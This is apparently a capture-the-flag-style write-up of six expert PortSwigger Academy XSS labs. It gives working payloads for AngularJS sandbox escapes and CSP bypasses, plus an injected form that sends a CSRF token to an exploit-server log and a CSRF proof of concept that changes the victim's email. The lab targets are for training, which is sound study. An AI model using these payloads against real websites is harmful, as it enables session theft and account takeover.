## Labs Covered

This write-up focuses on the following **EXPERT-level labs** from the PortSwigger Web Security Academy related to **Cross-site scripting (XSS)**:

**25 Reflected XSS with AngularJS sandbox escape without strings**  
<blockquote>
This lab demonstrates exploiting AngularJS sandbox escapes to execute reflected XSS without needing string payloads.
</blockquote>

**26 Reflected XSS with AngularJS sandbox escape and CSP**  
<blockquote>
This lab shows bypassing Content Security Policy (CSP) protections by escaping AngularJS sandboxes in reflected XSS attacks.
</blockquote>

**27 Reflected XSS with event handlers and href attributes blocked**  
<blockquote>
This lab explores reflected XSS where event handlers and href attributes are blocked, requiring alternative exploitation techniques.
</blockquote>

**28 Reflected XSS in a JavaScript URL with some characters blocked**  
<blockquote>
This lab demonstrates exploiting reflected XSS when the JavaScript URL scheme is filtered and some characters are blocked.
</blockquote>

**29 Reflected XSS protected by very strict CSP, with dangling markup attack**  
<blockquote>
This lab covers how dangling markup can be used to bypass very strict CSP and cause reflected XSS.
</blockquote>

**30 Reflected XSS protected by CSP, with CSP bypass**  
<blockquote>
This lab shows advanced techniques for bypassing CSP protections to achieve reflected XSS.
</blockquote>

---

### LAB 25 - Reflected XSS with AngularJS sandbox escape without strings

### Lab Description

![image](https://github.com/user-attachments/assets/c5a6746d-b6ab-443f-bf39-4d6e74ec0ccd)

### Solution

# AngularJS Sandbox Escape XSS Lab — No `$eval` & No Strings

This lab uses AngularJS in an unusual configuration where:

- `$eval` is **not available**
- **Strings are disabled**
- Traditional payloads will **fail**

---


## Recon & Setup

1. Navigate to the lab page.
2. Inject a **canary value** (e.g., `literallyethical`) into the search field.


   <img width="820" height="284" alt="image" src="https://github.com/user-attachments/assets/69773d2b-6375-47b0-9eae-b12ce519aab9" />

3. View the **page source** and confirm your canary appears within an AngularJS expression block — indicating Angular is parsing the query parameter.


<img width="819" height="194" alt="image" src="https://github.com/user-attachments/assets/12a00ae0-c05f-4973-a81c-8130ca8013d0" />

---

##  AngularJS Sandbox Note

AngularJS expressions are sandboxed by design — meaning:
- You can't use unsafe features like `window`, `Function()`, or `eval()`.
- You also can’t use strings directly like `'alert'`.

To bypass this, we need to exploit Angular's internal mechanics.

---

## Final Exploit Payload

Replace `YOUR-LAB-ID` with your actual lab instance ID and paste this URL in the browser:

```

[https://YOUR-LAB-ID.web-security-academy.net/?search=1\&toString().constructor.prototype.charAt=\[\].join;\[1\]|orderBy\:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1](https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString%28%29.constructor.prototype.charAt=[].join;[1]|orderBy:toString%28%29.constructor.fromCharCode%28120,61,97,108,101,114,116,40,49,41%29=1)

````


<img width="872" height="143" alt="image" src="https://github.com/user-attachments/assets/cc0e5bd7-6b2a-4424-ae54-2c993d64ecc7" />


 This payload triggers `alert(1)` and **solves the lab**.


<img width="871" height="242" alt="image" src="https://github.com/user-attachments/assets/cf0748a2-1c53-453c-8210-059dbd51cabf" />


---

##  Payload Breakdown

Let’s break it down step by step:

### 1. Override `.charAt()`

```js
toString().constructor.prototype.charAt = [].join;
````

* This overrides the default `charAt()` function to `join`, enabling string assembly without string literals.

---

### 2. Trigger AngularJS Filter Chain

```js
[1] | orderBy:
```

* `[1]` creates a simple array.
* `orderBy:` applies a filter, which evaluates its expression argument (and executes JavaScript!).

---

### 3. Bypass String Restrictions with `fromCharCode`

```js
toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

* This builds the string `x=alert(1)` character-by-character using ASCII codes.

  * `120` = `'x'`
  * `61` = `'='`
  * `97,108,101,114,116` = `'alert'`
  * `40,49,41` = `'(' + '1' + ')'`

---

### 4. Evaluate and Return Truthy

```js
=1
```

* Forces a truthy return, allowing the expression to complete and execute.

---

### Full Decoded Expression:

```js
toString().constructor.prototype.charAt = [].join;
[1] | orderBy: toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

Which is equivalent to:

```js
toString().constructor.prototype.charAt = [].join;
[1] | orderBy: "x=alert(1)" = 1
```

---

## Testing

Once this is submitted:

* Angular will parse and execute the `orderBy` expression.
* The sandbox will be escaped.
* `alert(1)` will fire.
* Lab will be marked as solved.

---



---

### LAB 26 - Reflected XSS with AngularJS sandbox escape and CSP

### Lab Description

![image](https://github.com/user-attachments/assets/1dfff8a4-6493-40a2-9b10-1b3fc4dc7673)

### Solution


#  AngularJS Sandbox Escape with CSP Bypass - `alert(document.cookie)`

This lab requires you to:

- **Bypass Content Security Policy (CSP)**
- **Escape AngularJS sandbox**
- **Trigger `alert(document.cookie)`**

---

## Goal

Perform a **Cross-Site Scripting (XSS)** attack via AngularJS **without using external scripts** and **without `$eval`**, while **bypassing CSP restrictions**.

---

##  Final Payload

Use the following script to inject your payload into the lab. Be sure to **replace `YOUR-LAB-ID`** with your actual lab instance ID:

```html
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
````

---

##  URL Decoded Version

```html
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';
</script>
```

---

##  Reverse Engineering the Payload

###  Step 1: Set the Location

```js
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=...'
```

* **`location`** is a JavaScript global object.
* When set, it causes the browser to **navigate to the new URL**.
* The URL contains:

  * A **search parameter** (`?search=`)
  * An AngularJS-based **injection payload**
  * A **fragment identifier** (`#x`) to auto-focus the input field.

---

###  Step 2: Understanding `ng-focus` and AngularJS Filters

```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
```

| Element                       | Explanation                                                               |                                                     |
| ----------------------------- | ------------------------------------------------------------------------- | --------------------------------------------------- |
| `<input id="x">`              | An input element is injected into the DOM with ID `x`.                    |                                                     |
| `ng-focus=...`                | Executes AngularJS expression when the input is focused.                  |                                                     |
| `$event.composedPath()`       | Gets an array of event propagation path elements.                         |                                                     |
| \`                            | orderBy:\`                                                                | AngularJS filter that accepts a function or string. |
| `'z=alert)(document.cookie)'` | Bypasses CSP: assigns `alert` to `z` and then calls `z(document.cookie)`. |                                                     |

---


<img width="882" height="257" alt="image" src="https://github.com/user-attachments/assets/6fd6e3f3-1c3b-4b7f-a428-9e7359fe0110" />


### Why This Works

* **No external JS** is loaded — satisfying CSP.
* **No `$eval` or strings** required — bypasses AngularJS sandbox.
* The expression is **triggered only when the input is focused**.
* The **fragment `#x`** causes the browser to auto-focus on the input.



<img width="917" height="332" alt="image" src="https://github.com/user-attachments/assets/5df6c268-e6ee-4fa7-afa0-bf79a37a663e" />

---

##  Steps to Solve the Lab

1. Navigate to the lab and go to the **Exploit Server**.
2. Paste the **script payload** into the **Body field**:

```html
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

3. Click **Store**.
4. Click **Deliver exploit to victim**.


<img width="1214" height="386" alt="image" src="https://github.com/user-attachments/assets/ebb46f30-f721-4b4c-9114-12d45d41a95e" />

---

##  Result

Once the victim visits the exploit page:

* The browser auto-focuses the input.
* The injected AngularJS expression runs.
* `alert(document.cookie)` pops.
*  **Lab is solved**


  <img width="1903" height="534" alt="image" src="https://github.com/user-attachments/assets/e3f3e5c1-2837-4802-9c83-bf88b80a8bd8" />


---

### LAB 27 - Reflected XSS with event handlers and href attributes blocked

### Lab Description

![image](https://github.com/user-attachments/assets/805f77bb-6586-4e33-a084-1ef4984caf6a)

### Solution


# Reflected XSS Using Valid Tags, SVG, and JavaScript URI

This lab involves finding valid HTML tags and crafting an **XSS payload** that triggers an alert using only **user interaction** and **supported tags/attributes**. The goal is to display `"Click me"` and **execute `alert(1)` when the user clicks the link**.



---

##  Step-by-Step Guide

### 1. Discover Valid HTML Tags

Using **Burp Intruder**, enumerate valid tags. You should find the following work:

```html
<a>
<animate>
<image>
<svg>
<title>
````

<img width="904" height="400" alt="image" src="https://github.com/user-attachments/assets/ced8b2bc-4f06-4b09-9251-f6c12fd87a66" />


### 2. Test Valid Payloads

Start with basic payload tests:

```html
<a id="x">Click Me</a>
<a id="x" tabindex="0">Click Me</a>
<svg><rect width="10" height="10" fill="red"></rect></svg>
```

Also test this (needs click interaction):

```html
<a href="javascript:alert(1)">Click Me</a>
```

<img width="879" height="464" alt="image" src="https://github.com/user-attachments/assets/2111011e-a703-4a0c-9715-ac912181bd19" />

## 3. Constructing the Exploit

We want to:

* Use valid elements like `<svg>`, `<a>`, and `<animate>`.
* Trigger `alert(1)` using **JavaScript URI** via the `href` attribute.
* Embed text like **"Click me"** to phish the user.

### SVG-Based Attack Structure

```html
<svg>
  <a>
    <animate attributeName=href values=javascript:alert(1)/>
    <text x=20 y=20>Click me</text>
  </a>
</svg>
```

This works because:

* `<animate>` sets the `href` of the `<a>` tag to `javascript:alert(1)`
* `<text>` gives a clickable label
* When the user clicks **Click me**, the `alert(1)` fires

---

## Final Payload

```html
<svg><a><animate attributeName=href values=javascript:alert(1)/><text x=20 y=20>Click me</text></a>
```

<img width="866" height="420" alt="image" src="https://github.com/user-attachments/assets/590ab33f-a418-4372-a941-66070fa65952" />


### Final URL (with your lab ID)

```html
https://YOUR-LAB-ID.web-security-academy.net/?search=<svg><a><animateattributeName=hrefvalues=javascript:alert(1)/><textx=20y=20>Click me</text></a>
```

### URL Encoded Payload

```
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```

---

## Steps to Solve the Lab

1. **Paste the encoded payload** into your browser.
2. The page will display **"Click me"**.
3. **Click the link** — the browser executes `javascript:alert(1)`.
4.  **Lab is solved!**

<img width="849" height="294" alt="image" src="https://github.com/user-attachments/assets/bccdc91d-d942-405d-b65a-14bb36d52f56" />

---

## Key Concepts

| Element           | Purpose                             |
| ----------------- | ----------------------------------- |
| `<svg>`           | Allows embedded vector graphics     |
| `<a>`             | Anchor/link element                 |
| `href`            | Executed by browser when clicked    |
| `<animate>`       | Modifies attributes dynamically     |
| `text`            | Visual bait to lure victim to click |
| `javascript:` URI | Triggers JS in vulnerable contexts  |

---


### LAB 28 - Reflected XSS in a JavaScript URL with some characters blocked

### Lab Description

![image](https://github.com/user-attachments/assets/90cdcea6-1471-40cf-9392-1d2af7d08aad)

### Solution

# Advanced XSS — Exploiting JavaScript Injection via `fetch()` Without `()`

This lab demonstrates a reflected XSS scenario where the application reflects part of the URL input into a JavaScript `fetch()` API call.

## Step-by-Step Breakdown

### 1. Identify the Injection Point

From the lab setup, it's evident that the `postId` parameter is reflected inside a JavaScript block. For example:

```javascript
fetch('/post?postId=1', {method: 'GET'})
````

If we visit:

```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=1
```

We can see the Back to Blog anchor tag uses this `postId`. To inject a payload without breaking the `postId` value, we append our injection using `&` instead of modifying the parameter itself.

<img width="936" height="349" alt="image" src="https://github.com/user-attachments/assets/e7937988-9513-4171-ab3f-a3381b0d6955" />

Ctrl+u on above page
---

<img width="941" height="210" alt="image" src="https://github.com/user-attachments/assets/7de7db71-3df7-440a-91c9-3800bf12a068" />


### 2. Understand the JavaScript Context

We're injecting into the second argument of the `fetch()` function:

```javascript
fetch('/post?postId=1', {method: 'GET'})
```

To close the object and inject safely, we use:

```
&'}
```

This effectively closes the object and lets us write arbitrary JavaScript.

---

### 3. Avoid Using `()`

Calling `alert(1337)` directly is blocked due to `()` character filtering. To work around this, we use JavaScript coercion via overriding `toString()` and forcing it to execute.

---

### 4. Crafting the Exploit

We define a function `f` and override `toString` to trigger it when `window` is converted to a string:

```javascript
f = x => { throw/**/onerror=alert,1337 }
toString = f
'' + window
```

When `'' + window` is executed, it triggers our custom `toString` function, causing `throw` to raise an error and `onerror=alert` to fire.

---

### 5. Final Payload

Here is the working payload:

```
&'},f=x=>{throw/**/onerror=alert,1337},toString=f,''+window,{x:'
```

Explanation:

* `&'}`: Closes the object inside `fetch()`.
* `f=x=>{throw/**/onerror=alert,1337}`: Defines a function that triggers alert.
* `toString=f`: Overrides the native `toString()` method.
* `'' + window`: Forces coercion and execution.
* `{x:'`: Keeps the final JavaScript syntax valid.

### Full URL

Replace `YOUR-LAB-ID` with your actual lab ID:

```
https://YOUR-LAB-ID.web-security-academy.net/post?postId=1&'},f=x=>{throw/**/onerror=alert,1337},toString=f,''+window,{x:'
```

<img width="495" height="218" alt="image" src="https://github.com/user-attachments/assets/447cbd00-b368-473e-9685-724c80a92a8c" />


## Lab Solved

This payload executes JavaScript without using parentheses and bypasses any restrictions on function calls like `alert()`.


---



### LAB 29 - Reflected XSS protected by very strict CSP, with dangling markup attack

### Lab Description

![image](https://github.com/user-attachments/assets/deef926d-e143-40af-ac35-4eb3fa7b6f59)

### Solution


# Exploiting XSS to Steal CSRF Token and Change Email

This lab requires chaining **Cross-Site Scripting (XSS)** and **Cross-Site Request Forgery (CSRF)** to change the victim’s email address.

---

## Attack Strategy

1. **Trigger an XSS payload that executes on the victim’s session.**
2. **Craft a form injection to steal the CSRF token.**
3. **Capture the token on your exploit server.**
4. **Use the token to change the victim’s email address via a CSRF PoC.**

---

## Step-by-Step Walkthrough

### Step 1: Inject HTML Form to Capture CSRF Token

The XSS vector targets the `email` parameter. You can inject a closing tag to break the existing form and introduce your own:

```html
"></form><form class="login-form" name="evil-form" action="https://exploit-0aad00e50419a26982bdf14301f9006c.exploit-server.net/log" method="POST">
````
<img width="1494" height="641" alt="image" src="https://github.com/user-attachments/assets/a969ba73-f1b4-4a57-aa84-9b84d3d95b47" />


This form will capture and submit any autofilled CSRF token field to your exploit server.

---

### Step 2: Host Exploit on Exploit Server

Payload:

```html
<script>
location = 'https://0a3a006c041ba288822ff20900fa00c8.web-security-academy.net/my-account?email=%22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://exploit-0aad00e50419a26982bdf14301f9006c.exploit-server.net/log%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3EClick%20me%3C/button%3E';
</script>
```

* Host this code on the **Exploit Server**.
* Click **"Deliver exploit to victim"**.

<img width="983" height="559" alt="image" src="https://github.com/user-attachments/assets/31efc920-37b1-4706-86ff-d192e70aec58" />

---

### Step 3: Capture the CSRF Token

Once the victim visits the exploit page, the fake form submits the CSRF token to your server. You can view this in the **Exploit Server Logs**.

<img width="1920" height="110" alt="image" src="https://github.com/user-attachments/assets/ecb00f80-9533-44f6-ace1-18906447aabe" />

---

### Step 4: Craft CSRF PoC to Change Email

After obtaining the token, use Burp Suite's **Generate CSRF PoC** tool or create your own like below:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a54003704a897438303ff0e00f40097.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="lPYOYwKwk9iSWIfnAcG7bXDBLtzXPzvG" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

* Replace the `csrf` value with the one you stole.
* Upload this HTML to the **Exploit Server** and click **"Deliver exploit to victim"**.

<img width="798" height="454" alt="image" src="https://github.com/user-attachments/assets/a595e728-c063-45fb-b152-9ee3001fe36d" />


---

## Result

The victim’s email gets changed to `hacker@evil-user.net`, and the lab is successfully solved.

<img width="1325" height="870" alt="image" src="https://github.com/user-attachments/assets/7e60b8c2-3e4b-46f1-b3bd-d99b01f8c254" />

---

### LAB 30 - Reflected XSS protected by CSP, with CSP bypass

### Lab Description

![image](https://github.com/user-attachments/assets/fa28258c-e9f8-4321-a888-6380526e8bb2)

### Solution


# Bypassing CSP to Exploit XSS

In this lab, we are asked to solve a Cross-Site Scripting (XSS) vulnerability by bypassing a **misconfigured Content Security Policy (CSP)**.

---

## Initial Payload Blocked by CSP

When we try the basic XSS payload:

```html
<img src=1 onerror=alert(1)>
````

…it doesn't execute. This is because the **CSP policy** in place prevents inline script execution.

 <img width="1904" height="740" alt="image" src="https://github.com/user-attachments/assets/289f3221-9ae9-407b-9b93-cac3c598873b" />

---

## Inspecting the CSP Header

Using Burp Suite, we observe the following CSP directive in the server's response headers:

```
default-src 'self'; object-src 'none'; script-src 'self'; style-src 'self'; report-uri /csp-report?token=
```

### Key Observations:

* `script-src 'self'`: Only allows scripts loaded from the same origin.
* `object-src 'none'`: Disallows Flash or other plugins.
* `report-uri`: Accepts a `token` parameter used for violation reports.

Interestingly, this `token` is **not validated properly** and can be abused to inject new CSP directives into the response.

---

## Exploiting Misconfigured `token` Parameter

When we append the following payload to the `token` parameter:

```
;script-src-elem 'unsafe-inline'
```

It overrides the existing `script-src-elem` directive, allowing inline `<script>` tags to execute.

---

## Final Payload

```text
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

### URL-Decoded Version of payload:

<img width="1920" height="493" alt="image" src="https://github.com/user-attachments/assets/12d25003-baf7-4411-be74-bb0b4ed1a520" />

This payload successfully executes an XSS by bypassing the CSP.

<img width="1672" height="335" alt="image" src="https://github.com/user-attachments/assets/a68e3652-6564-47fa-a5c7-d19b604a730e" />


After injecting the payload, the lab is solved.


---

